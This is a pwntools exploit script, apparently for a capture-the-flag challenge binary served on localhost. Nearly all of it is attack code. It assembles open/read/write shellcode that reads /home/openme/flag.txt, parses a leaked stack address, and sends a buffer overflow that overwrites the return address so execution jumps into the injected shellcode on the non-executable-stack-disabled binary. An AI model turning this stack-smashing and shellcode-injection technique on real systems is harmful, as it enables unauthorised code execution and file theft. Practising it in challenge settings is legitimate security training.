#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11102 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000401342
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

bss = 0x404100

shell = shellcraft.open("/home/openme/flag.txt",0,0)
shell += shellcraft.read("rax",bss,0x100)
shell += shellcraft.write(1,bss,0x100)

print len(asm(shell))
shell = """
mov rax, 0x7478742e67
push rax
mov rax, 0x616c662f656d6e65
push rax
mov rax, 0x706f2f656d6f682f
push rax
mov rdi, rsp
xor edx, edx 
xor esi, esi 
push SYS_open 
pop rax
syscall
mov rdi, rax
mov esi, 0x404200 
mov edx, 0x100 
xor eax, eax 
syscall
mov edi,0x1
mov edx, 0x100 
push 1
pop rax
syscall
"""

print len(asm(shell))

io.recvuntil(" : ")
stack = int(io.recvline()[:-1],16)+24

p = 'a'*16
p += p64(stack)
p += asm(shell).ljust(80,"\x00")
io.sendline(p)

io.interactive()

